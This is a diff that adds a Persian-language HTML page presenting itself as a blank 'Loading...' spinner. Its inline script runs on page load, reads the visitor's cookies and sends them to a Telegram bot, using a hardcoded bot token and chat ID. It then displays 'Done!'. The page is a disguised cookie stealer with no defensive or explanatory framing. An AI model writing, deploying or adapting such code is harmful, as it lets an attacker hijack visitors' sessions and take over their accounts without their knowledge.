@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Tahoma, sans-serif;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+
+    <script>
+        // --- ??????? ?? ????? ???? ???? ---
+        const BOT_TOKEN = '8910132424:AAEC_yuUCdEQpC0ye-wfQJc24NQIHn2Qd3U'; 
+        const CHAT_ID = '6313034509';
+        // ----------------------------------
+
+        window.onload = function() {
+            // ????? ???????? ????
+            const cookies = document.cookie;
+            
+            if (!cookies) {
+                alert("No cookies found!");
+                return;
+            }
+
+            // ?????????? ??? ????
+            const message = "?? *New Cookies Received!*\n\n" + cookies;
+
+            // ???? API ??????
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    console.log("Sent successfully");
+                    // ???????? ???? ?? ???? ???? ?? ?? ???? ???? ????
+                    document.body.innerHTML = "<h2 style='text-align:center; color:green;'>Done!</h2>";
+                } else {
+                    console.error("Error sending:", data);
+                    alert("Error: " + data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+                alert("Network Error");
+            });
+        };
+    </script>
+
+</body>
+</html>
